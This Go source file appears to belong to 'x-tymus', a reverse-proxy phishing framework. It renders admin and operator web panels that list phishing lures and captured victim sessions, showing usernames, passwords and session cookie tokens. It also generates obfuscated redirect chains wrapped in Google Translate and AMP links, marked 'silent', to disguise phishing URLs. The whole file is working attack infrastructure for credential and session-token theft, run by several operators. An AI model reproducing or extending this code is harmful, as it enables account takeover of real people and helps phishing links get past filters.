package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

// ───────────────────────────── CSS / shell ─────────────────────────────────

const panelCSS = `
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Segoe UI',monospace;font-size:14px}
h1{color:#e05252;font-size:1.4rem;margin-bottom:4px}
h2{color:#e0a040;font-size:1.1rem;margin:24px 0 8px;border-bottom:1px solid #222;padding-bottom:6px}
a{color:#52b0e0;text-decoration:none}a:hover{text-decoration:underline}
.wrap{max-width:1300px;margin:0 auto;padding:24px 16px}
.topbar{background:#111;border-bottom:1px solid #2a2a2a;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
.topbar .brand{color:#e05252;font-size:1.1rem;font-weight:bold;letter-spacing:2px}
.topbar .sub{color:#555;font-size:.82rem}
.topbar nav{margin-left:auto;display:flex;gap:12px}
.topbar nav a{color:#888;font-size:.82rem}
.topbar nav a:hover{color:#e0e0e0}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.75rem;font-weight:600}
.badge-green{background:#0d2a0d;color:#4cd44c}
.badge-red{background:#2a0d0d;color:#e05252}
.badge-blue{background:#0d1a2a;color:#52b0e0}
.badge-yellow{background:#2a1e00;color:#e0a040}
.badge-gray{background:#1e1e1e;color:#777}
.stats{display:flex;gap:12px;margin:16px 0;flex-wrap:wrap}
.stat-box{background:#141414;border:1px solid #252525;border-radius:6px;padding:14px 22px;min-width:130px}
.stat-box .n{font-size:2rem;font-weight:700;color:#e05252}
.stat-box .n.green{color:#4cd44c}
.stat-box .n.blue{color:#52b0e0}
.stat-box .l{font-size:.75rem;color:#555;margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
table{width:100%;border-collapse:collapse;margin-top:6px;font-size:.84rem}
th{background:#161616;color:#666;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px;padding:8px 10px;text-align:left;border-bottom:1px solid #252525}
td{padding:7px 10px;border-bottom:1px solid #181818;vertical-align:middle}
tr:hover td{background:#121212}
.mono{font-family:monospace;font-size:.82rem;color:#aaa}
.url-cell{font-family:monospace;font-size:.78rem;color:#52b0e0;word-break:break-all;max-width:260px}
form.inline{display:inline}
input[type=text],input[type=password],select{background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:6px 10px;border-radius:4px;font-size:.84rem}
input[type=text]:focus,input[type=password]:focus,select:focus{outline:none;border-color:#484848}
button,.btn{background:#1e1212;border:1px solid #4a2020;color:#e05252;padding:5px 14px;border-radius:4px;cursor:pointer;font-size:.8rem;text-decoration:none;display:inline-block}
button:hover,.btn:hover{background:#2a1818;border-color:#7a3333}
.btn-blue{background:#101820;border-color:#1e4466;color:#52b0e0}
.btn-blue:hover{background:#152030;border-color:#2a5588}
.btn-green{background:#0d1e0d;border-color:#1e4a1e;color:#4cd44c}
.btn-green:hover{background:#102510;border-color:#2a6a2a}
.btn-gray{background:#181818;border-color:#2e2e2e;color:#777}
.section{margin-top:32px}
.form-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
.card{background:#111;border:1px solid #222;border-radius:6px;padding:16px;margin:10px 0}
.err{color:#e05252;background:#1a0808;border:1px solid #3a1212;border-radius:4px;padding:8px 12px;margin:10px 0;font-size:.84rem}
.ok{color:#4cd44c;background:#081a08;border:1px solid #123a12;border-radius:4px;padding:8px 12px;margin:10px 0;font-size:.84rem}
.empty{color:#383838;font-style:italic;padding:14px 0;font-size:.84rem}
.chain-box{background:#0a0e0a;border:1px solid #1a2e1a;border-radius:5px;padding:12px 14px;margin-top:8px;font-size:.78rem}
.chain-box .label{color:#4cd44c;font-weight:600;margin-bottom:4px;font-size:.72rem;text-transform:uppercase;letter-spacing:.5px}
.chain-box .link{font-family:monospace;color:#52e08a;word-break:break-all;margin-bottom:8px}
.chain-box .link a{color:#52e08a}
.chain-box .hop{font-family:monospace;color:#555;font-size:.72rem;margin-top:2px;word-break:break-all}
details>summary{cursor:pointer;color:#52b0e0;font-size:.8rem;padding:4px 0;list-style:none}
details>summary::-webkit-details-marker{display:none}
details[open]>summary{color:#e0a040}
pre{background:#0a0a0a;border:1px solid #1e1e1e;padding:10px;border-radius:4px;overflow-x:auto;font-size:.75rem;color:#aaa;white-space:pre-wrap;word-break:break-all}
.tabs{display:flex;gap:0;border-bottom:1px solid #252525;margin-bottom:16px}
.tab{padding:8px 18px;cursor:pointer;font-size:.82rem;color:#666;border-bottom:2px solid transparent}
.tab.active{color:#e0a040;border-bottom-color:#e0a040}
`

func panelPage(title, navExtra, body string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>%s — x-tymus</title>
<style>%s</style>
</head>
<body>
<div class="topbar">
  <span class="brand">◈ x-tymus</span>
  <span class="sub">%s</span>
  <nav>%s</nav>
</div>
<div class="wrap">%s</div>
<script>
// copy-to-clipboard helper
function cp(el){
  var t=el.getAttribute('data-copy');
  navigator.clipboard&&navigator.clipboard.writeText(t).then(function(){
    var old=el.textContent;el.textContent='copied!';setTimeout(function(){el.textContent=old},1200);
  });
}
</script>
</body></html>`, title, panelCSS, title, navExtra, body)
}

// ───────────────────────────── Auth ────────────────────────────────────────

func (s *HttpServer) requireAdminAuth(w http.ResponseWriter, r *http.Request) bool {
	pass := s.Cfg.GetAdminPassword()
	if pass == "" {
		http.Error(w, "Admin password not set. Run: config admin_password <pass>", http.StatusForbidden)
		return false
	}
	user, pw, ok := r.BasicAuth()
	if !ok || user != "admin" || pw != pass {
		w.Header().Set("WWW-Authenticate", `Basic realm="x-tymus Admin"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return false
	}
	return true
}

// ───────────────────────────── Admin Panel ─────────────────────────────────

func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdminAuth(w, r) {
		return
	}

	// ── POST actions ──
	if r.Method == http.MethodPost {
		r.ParseForm()
		switch r.FormValue("action") {

		case "create_user":
			uname := strings.TrimSpace(r.FormValue("username"))
			pass := strings.TrimSpace(r.FormValue("password"))
			if uname == "" || pass == "" {
				http.Redirect(w, r, "/admin/panel?err=username+and+password+required", http.StatusSeeOther)
				return
			}
			token := GenRandomToken()
			if _, err := s.Db.CreateUser(uname, pass, token); err != nil {
				log.Error("admin: create user: %v", err)
				http.Redirect(w, r, "/admin/panel?err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
				return
			}
			log.Info("admin: created user '%s'", uname)
			http.Redirect(w, r, "/admin/panel?ok=user+created", http.StatusSeeOther)
			return

		case "delete_user":
			id, _ := strconv.Atoi(r.FormValue("id"))
			s.Db.DeleteUserById(id)
			http.Redirect(w, r, "/admin/panel", http.StatusSeeOther)
			return

		case "assign_lure":
			lureIdx, _ := strconv.Atoi(r.FormValue("lure_id"))
			username := strings.TrimSpace(r.FormValue("username"))
			l, err := s.Cfg.GetLure(lureIdx)
			if err == nil {
				if username == "" || username == "-" {
					l.UserId = ""
				} else {
					l.UserId = username
				}
				s.Cfg.SetLure(lureIdx, l)
			}
			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
			return

		case "blacklist_add":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.AddIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "blacklist_remove":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.RemoveIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "delete_session":
			sid, _ := strconv.Atoi(r.FormValue("session_id"))
			s.Db.DeleteSessionById(sid)
			http.Redirect(w, r, "/admin/panel?tab=sessions", http.StatusSeeOther)
			return
		}
	}

	// ── Gather data ──
	userList, _ := s.Db.ListUsers()
	allSessions, _ := s.Db.ListSessions()
	allLures := s.Cfg.GetAllLures()

	totalTokens := 0
	for _, sess := range allSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	sessPerUser := map[string]int{}
	tokenPerUser := map[string]int{}
	for _, sess := range allSessions {
		for _, l := range allLures {
			if l.Phishlet == sess.Phishlet && l.UserId != "" {
				sessPerUser[l.UserId]++
				if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
					tokenPerUser[l.UserId]++
				}
				break
			}
		}
	}

	blCount := 0
	if GlobalBlacklist != nil {
		n, m := GlobalBlacklist.GetStats()
		blCount = n + m
	}

	activeTab := r.URL.Query().Get("tab")
	if activeTab == "" {
		activeTab = "overview"
	}
	errMsg := r.URL.Query().Get("err")
	okMsg := r.URL.Query().Get("ok")

	var b strings.Builder

	// ── Header & stats ──
	b.WriteString(`<h1>Admin Panel</h1>`)
	b.WriteString(fmt.Sprintf(`<div class="stats">
  <div class="stat-box"><div class="n">%d</div><div class="l">Users</div></div>
  <div class="stat-box"><div class="n blue">%d</div><div class="l">Lures</div></div>
  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
  <div class="stat-box"><div class="n green">%d</div><div class="l">With Tokens</div></div>
  <div class="stat-box"><div class="n" style="color:#e0a040">%d</div><div class="l">Blacklisted</div></div>
</div>`, len(userList), len(allLures), len(allSessions), totalTokens, blCount))

	if errMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="err">%s</div>`, template.HTMLEscapeString(errMsg)))
	}
	if okMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="ok">%s</div>`, template.HTMLEscapeString(okMsg)))
	}

	// ── Tab nav ──
	tabs := []struct{ id, label string }{
		{"overview", "Overview"},
		{"users", "Users"},
		{"lures", "Lures & Chains"},
		{"sessions", "Sessions"},
		{"blacklist", "Blacklist"},
	}
	b.WriteString(`<div class="tabs">`)
	for _, t := range tabs {
		cls := "tab"
		if t.id == activeTab {
			cls += " active"
		}
		b.WriteString(fmt.Sprintf(`<a href="/admin/panel?tab=%s" class="%s">%s</a>`, t.id, cls, t.label))
	}
	b.WriteString(`</div>`)

	switch activeTab {

	// ── OVERVIEW ──────────────────────────────────────────────────────────
	case "overview":
		b.WriteString(`<div class="section"><h2>Recent Sessions</h2>`)
		recent := allSessions
		if len(recent) > 10 {
			recent = recent[len(recent)-10:]
		}
		if len(recent) == 0 {
			b.WriteString(`<div class="empty">No sessions yet.</div>`)
		} else {
			b.WriteString(sessionTable(recent, false))
		}
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section"><h2>Users at a Glance</h2>`)
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── USERS ─────────────────────────────────────────────────────────────
	case "users":
		b.WriteString(`<div class="section"><h2>Create User</h2>`)
		b.WriteString(`<form method="POST" action="/admin/panel">
<input type="hidden" name="action" value="create_user">
<div class="form-row">
  <input type="text" name="username" placeholder="username" required style="width:160px">
  <input type="password" name="password" placeholder="password" required style="width:160px">
  <button type="submit" class="btn-blue">+ Create User</button>
</div></form>`)
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section"><h2>All Users</h2>`)
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── LURES & CHAINS ────────────────────────────────────────────────────
	case "lures":
		b.WriteString(`<div class="section"><h2>All Lures</h2>`)
		if len(allLures) == 0 {
			b.WriteString(`<div class="empty">No lures configured. Use the terminal: <code>lures create &lt;phishlet&gt;</code></div>`)
		} else {
			b.WriteString(`<table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Assigned User</th><th>Redirect Chain</th><th>Actions</th>
</tr></thead><tbody>`)
			for i, l := range allLures {
				// Build the phishing URL for this lure
				lureURL := ""
				if l.Hostname != "" {
					lureURL = "https://" + l.Hostname + l.Path
				} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
					if pu, err := pl.GetLureUrl(l.Path); err == nil {
						lureURL = pu
					}
				}

				lureURLCell := `<span style="color:#383838">—</span>`
				if lureURL != "" {
					lureURLCell = fmt.Sprintf(`<span class="url-cell">%s</span>
<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-top:3px" onclick="cp(this)" data-copy="%s">copy</button>`,
						template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
				}

				redirectCell := `<span style="color:#383838">—</span>`
				if l.RedirectUrl != "" {
					redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.76rem">%s</a>`,
						template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 36)))
				}

				userCell := `<span style="color:#383838">unassigned</span>`
				if l.UserId != "" {
					userCell = fmt.Sprintf(`<span class="badge badge-blue">%s</span>`, template.HTMLEscapeString(l.UserId))
				}

				// Generate redirect chain links
				chainCell := `<span style="color:#383838">—</span>`
				if lureURL != "" {
					parsedURL, err := url.Parse(lureURL)
					if err == nil {
						phishBase := parsedURL.Scheme + "://" + parsedURL.Host
						outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
						if err == nil {
							translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
							ampPath := strings.TrimPrefix(outer, "https://")
							ampLink := "https://www.google.com/amp/s/" + ampPath

							chainID := fmt.Sprintf("chain-%d", i)
							chainCell = fmt.Sprintf(`<details id="%s">
<summary>▶ generate chain</summary>
<div class="chain-box">
  <div class="label">Google Translate (recommended — silent)</div>
  <div class="link"><a href="%s" target="_blank">%s</a>
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Google AMP (silent)</div>
  <div class="link"><a href="%s" target="_blank">%s</a>
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Direct chain (no wrapper)</div>
  <div class="link"><a href="%s" target="_blank">%s</a>
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label" style="margin-top:8px">Hops</div>`,
								chainID,
								template.HTMLEscapeString(translateLink), template.HTMLEscapeString(truncateStr(translateLink, 60)), template.HTMLEscapeString(translateLink),
								template.HTMLEscapeString(ampLink), template.HTMLEscapeString(truncateStr(ampLink, 60)), template.HTMLEscapeString(ampLink),
								template.HTMLEscapeString(outer), template.HTMLEscapeString(truncateStr(outer, 60)), template.HTMLEscapeString(outer),
							)
							for j, hop := range hops {
								chainCell += fmt.Sprintf(`<div class="hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
							}
							chainCell += fmt.Sprintf(`<div class="hop" style="color:#2a6a2a">final → %s</div>`, template.HTMLEscapeString(lureURL))
							chainCell += `</div></details>`
						}
					}
				}

				// Assign user form
				userOptions := `<option value="-">— unassign —</option>`
				for _, u := range userList {
					sel := ""
					if u.Username == l.UserId {
						sel = " selected"
					}
					userOptions += fmt.Sprintf(`<option value="%s"%s>%s</option>`,
						template.HTMLEscapeString(u.Username), sel, template.HTMLEscapeString(u.Username))
				}
				assignForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures" style="display:flex;gap:4px;align-items:center">
<input type="hidden" name="action" value="assign_lure">
<input type="hidden" name="lure_id" value="%d">
<select name="username" style="font-size:.76rem;padding:3px 6px">%s</select>
<button type="submit" style="font-size:.74rem;padding:3px 8px">save</button>
</form>`, i, userOptions)

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s<br style="margin:4px">%s</td>
<td>%s</td>
<td>%s</td>
</tr>`, i,
					template.HTMLEscapeString(l.Phishlet),
					lureURLCell, redirectCell,
					userCell, assignForm,
					chainCell,
					`<span style="color:#383838;font-size:.74rem">edit in terminal</span>`,
				))
			}
			b.WriteString(`</tbody></table>`)
		}
		b.WriteString(`</div>`)

	// ── SESSIONS ──────────────────────────────────────────────────────────
	case "sessions":
		b.WriteString(`<div class="section"><h2>All Sessions</h2>`)
		if len(allSessions) == 0 {
			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
		} else {
			b.WriteString(sessionTable(allSessions, true))
		}
		b.WriteString(`</div>`)

	// ── BLACKLIST ─────────────────────────────────────────────────────────
	case "blacklist":
		b.WriteString(`<div class="section"><h2>Add to Blacklist</h2>`)
		b.WriteString(`<form method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_add">
<div class="form-row">
  <input type="text" name="ip" placeholder="IP or CIDR e.g. 1.2.3.4 or 1.2.3.0/24" style="width:280px">
  <button type="submit">Block IP / CIDR</button>
</div></form>`)
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section"><h2>Blocked IPs</h2>`)
		if GlobalBlacklist == nil {
			b.WriteString(`<div class="empty">Blacklist not loaded.</div>`)
		} else {
			ips := make([]string, 0, len(GlobalBlacklist.ips))
			for k := range GlobalBlacklist.ips {
				ips = append(ips, k)
			}
			if len(ips) == 0 && len(GlobalBlacklist.masks) == 0 {
				b.WriteString(`<div class="empty">No IPs blocked yet.</div>`)
			} else {
				b.WriteString(`<table><thead><tr><th>IP / CIDR</th><th>Type</th><th></th></tr></thead><tbody>`)
				for _, ip := range ips {
					b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-gray">IP</span></td>
<td>
<form class="inline" method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_remove">
<input type="hidden" name="ip" value="%s">
<button type="submit" style="font-size:.74rem;padding:2px 8px">remove</button>
</form>
</td></tr>`, template.HTMLEscapeString(ip), template.HTMLEscapeString(ip)))
				}
				for _, m := range GlobalBlacklist.masks {
					if m.mask != nil {
						b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-yellow">CIDR</span></td>
<td><span style="color:#383838;font-size:.74rem">auto-blocked</span></td>
</tr>`, template.HTMLEscapeString(m.mask.String())))
					}
				}
				b.WriteString(`</tbody></table>`)
			}
		}
		b.WriteString(`</div>`)
	}

	nav := `<a href="/admin/panel?tab=overview">overview</a>
<a href="/admin/panel?tab=users">users</a>
<a href="/admin/panel?tab=lures">lures</a>
<a href="/admin/panel?tab=sessions">sessions</a>
<a href="/admin/panel?tab=blacklist">blacklist</a>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("Admin Panel", nav, b.String()))
}

// ───────────────────────────── User Panel ──────────────────────────────────

func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 2 {
		http.NotFound(w, r)
		return
	}
	token := parts[1]

	user, err := s.Db.UserGetByToken(token)
	if err != nil {
		http.Error(w, "Invalid panel token", http.StatusForbidden)
		return
	}

	lures := s.Cfg.GetLuresByUser(user.Username)
	sessions, _ := s.Db.ListSessions()

	userPhishlets := map[string]bool{}
	for _, l := range lures {
		userPhishlets[l.Phishlet] = true
	}
	var userSessions []*database.Session
	for _, sess := range sessions {
		if userPhishlets[sess.Phishlet] {
			userSessions = append(userSessions, sess)
		}
	}

	totalTokens := 0
	for _, sess := range userSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	var b strings.Builder

	b.WriteString(fmt.Sprintf(`<h1>Panel</h1>
<p style="color:#555;margin:4px 0 16px">Logged in as <span style="color:#52b0e0;font-weight:600">%s</span></p>
<div class="stats">
  <div class="stat-box"><div class="n blue">%d</div><div class="l">Lures</div></div>
  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
  <div class="stat-box"><div class="n green">%d</div><div class="l">With Tokens</div></div>
</div>`, user.Username, len(lures), len(userSessions), totalTokens))

	// Lures with chain generation
	b.WriteString(`<div class="section"><h2>Your Lures</h2>`)
	if len(lures) == 0 {
		b.WriteString(`<div class="empty">No lures assigned to your account yet.</div>`)
	} else {
		b.WriteString(`<table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Chain Links</th>
</tr></thead><tbody>`)
		for i, l := range lures {
			lureURL := ""
			if l.Hostname != "" {
				lureURL = "https://" + l.Hostname + l.Path
			} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
				if pu, err := pl.GetLureUrl(l.Path); err == nil {
					lureURL = pu
				}
			}

			lureURLCell := `<span style="color:#383838">—</span>`
			if lureURL != "" {
				lureURLCell = fmt.Sprintf(`<span class="url-cell">%s</span><br>
<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-top:3px" onclick="cp(this)" data-copy="%s">copy</button>`,
					template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
			}

			redirectCell := `<span style="color:#383838">—</span>`
			if l.RedirectUrl != "" {
				redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.76rem">%s</a>`,
					template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 40)))
			}

			chainCell := `<span style="color:#383838">—</span>`
			if lureURL != "" {
				parsedURL, err := url.Parse(lureURL)
				if err == nil {
					phishBase := parsedURL.Scheme + "://" + parsedURL.Host
					outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
					if err == nil {
						translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
						ampPath := strings.TrimPrefix(outer, "https://")
						ampLink := "https://www.google.com/amp/s/" + ampPath

						chainCell = fmt.Sprintf(`<details>
<summary>▶ show chain links</summary>
<div class="chain-box">
  <div class="label">Google Translate (recommended)</div>
  <div class="link">%s
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Google AMP</div>
  <div class="link">%s
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>

  <div class="label">Direct (3 hops)</div>
  <div class="link">%s
  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
							template.HTMLEscapeString(truncateStr(translateLink, 55)), template.HTMLEscapeString(translateLink),
							template.HTMLEscapeString(truncateStr(ampLink, 55)), template.HTMLEscapeString(ampLink),
							template.HTMLEscapeString(truncateStr(outer, 55)), template.HTMLEscapeString(outer),
						)
						for j, hop := range hops {
							chainCell += fmt.Sprintf(`<div class="hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
						}
						chainCell += `</div></details>`
					}
				}
			}

			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s</td>
</tr>`, i, template.HTMLEscapeString(l.Phishlet), lureURLCell, redirectCell, chainCell))
		}
		b.WriteString(`</tbody></table>`)
	}
	b.WriteString(`</div>`)

	// Sessions
	b.WriteString(`<div class="section"><h2>Captured Sessions</h2>`)
	if len(userSessions) == 0 {
		b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
	} else {
		b.WriteString(sessionTable(userSessions, false))
	}
	b.WriteString(`</div>`)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("User Panel", "", b.String()))
}

// ───────────────────────────── Shared helpers ──────────────────────────────

func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenPerUser map[string]int) string {
	if len(userList) == 0 {
		return `<div class="empty">No users yet.</div>`
	}
	var b strings.Builder
	b.WriteString(`<table><thead><tr>
<th>Username</th><th>Panel URL</th><th>Lures</th><th>Sessions</th><th>Tokens</th><th>Created</th><th></th>
</tr></thead><tbody>`)
	for _, u := range userList {
		lureCount := 0
		for _, l := range allLures {
			if l.UserId == u.Username {
				lureCount++
			}
		}
		panelURL := fmt.Sprintf("/panel/%s", u.Token)
		b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-blue">%s</span></td>
<td><a href="%s" target="_blank" class="mono" style="font-size:.78rem">%s</a>
<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-left:4px" onclick="cp(this)" data-copy="%s">copy</button></td>
<td class="mono">%d</td>
<td class="mono">%d</td>
<td class="mono" style="color:#4cd44c">%d</td>
<td class="mono">%s</td>
<td>
  <form class="inline" method="POST" action="/admin/panel?tab=users" onsubmit="return confirm('Delete %s?')">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="id" value="%d">
    <button type="submit" style="font-size:.74rem;padding:2px 8px">delete</button>
  </form>
</td></tr>`,
			template.HTMLEscapeString(u.Username),
			panelURL, truncateStr(panelURL, 38), panelURL,
			lureCount,
			sessPerUser[u.Username],
			tokenPerUser[u.Username],
			time.Unix(u.CreatedAt, 0).Format("2006-01-02"),
			template.HTMLEscapeString(u.Username),
			u.Id,
		))
	}
	b.WriteString(`</tbody></table>`)
	return b.String()
}

func sessionTable(sessions []*database.Session, showDelete bool) string {
	var b strings.Builder
	b.WriteString(`<table><thead><tr>
<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Tokens</th><th>Remote IP</th><th>Time</th><th>Detail</th>`)
	if showDelete {
		b.WriteString(`<th></th>`)
	}
	b.WriteString(`</tr></thead><tbody>`)
	for _, sess := range sessions {
		hasCreds := sess.Username != "" || sess.Password != ""
		hasTokens := len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0

		tokenBadge := `<span class="badge badge-gray">none</span>`
		if hasTokens {
			tokenBadge = `<span class="badge badge-green">captured</span>`
		}

		uname := template.HTMLEscapeString(sess.Username)
		if uname == "" {
			uname = `<span style="color:#383838">—</span>`
		}
		pass := template.HTMLEscapeString(sess.Password)
		if pass == "" {
			pass = `<span style="color:#383838">—</span>`
		}

		// Build expandable token detail
		detail := `<span style="color:#383838">—</span>`
		if hasCreds || hasTokens {
			tokenJSON, _ := json.MarshalIndent(map[string]interface{}{
				"cookie_tokens": sess.CookieTokens,
				"body_tokens":   sess.BodyTokens,
				"http_tokens":   sess.HttpTokens,
			}, "", "  ")
			detailID := fmt.Sprintf("sess-%d", sess.Id)
			detail = fmt.Sprintf(`<details id="%s">
<summary>▶ view tokens</summary>
<pre>%s</pre>
</details>`, detailID, template.HTMLEscapeString(string(tokenJSON)))
		}

		b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%d</td>
<td><span class="badge badge-red">%s</span></td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>`,
			sess.Id,
			template.HTMLEscapeString(sess.Phishlet),
			uname, pass, tokenBadge,
			template.HTMLEscapeString(sess.RemoteAddr),
			time.Unix(sess.UpdateTime, 0).Format("2006-01-02 15:04"),
			detail,
		))
		if showDelete {
			b.WriteString(fmt.Sprintf(`<td>
<form class="inline" method="POST" action="/admin/panel?tab=sessions">
<input type="hidden" name="action" value="delete_session">
<input type="hidden" name="session_id" value="%d">
<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
</form></td>`, sess.Id))
		}
		b.WriteString(`</tr>`)
	}
	b.WriteString(`</tbody></table>`)
	return b.String()
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
